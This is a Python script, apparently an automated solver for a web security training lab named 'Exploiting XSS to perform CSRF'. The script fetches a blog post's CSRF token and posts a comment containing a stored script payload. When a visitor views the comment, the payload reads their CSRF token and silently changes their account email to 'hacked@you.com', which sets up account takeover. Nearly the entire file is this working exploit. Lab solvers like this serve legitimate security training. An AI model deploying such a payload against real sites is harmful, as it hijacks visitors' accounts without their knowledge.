import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting XSS to perform CSRF"

def run(url, payload=None, proxies=None):
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    try:
        # Step 1: Fetch the blog post
        r = session.get(url.rstrip('/') + "/post?postId=1")
        csrf_token = re.search(r'name="csrf" value="(.+?)"', r.text).group(1)

        # Step 2: Post comment with XSS payload
        data = {
            "csrf": csrf_token,
            "postId": "1",
            "name": "mystic_mido",
            "email": "mystic_mido@mystic_mido.com",
            "comment": f"""<script>
                    window.onload = function(){{
                        var token = document.forms[0].firstElementChild.value;
                        fetch("{url.rstrip('/')}/my-account/change-email", {{
                            method: "POST",
                            headers: {{
                                "Content-Type":  "application/x-www-form-urlencoded"
                            }},
                            body: "csrf=" + token + "&email=hacked@you.com" 
                        }});
                    }};
                </script>"""
        }

        response = session.post(url.rstrip('/') + "/post/comment", data=data)
        r = session.get(url.rstrip('/') + "/post?postId=1")
        return "Congratulations, you solved the lab!" in response.text or response.status_code == 200

    except Exception as e:
        print(f"[!] Error: {e}")
        return False
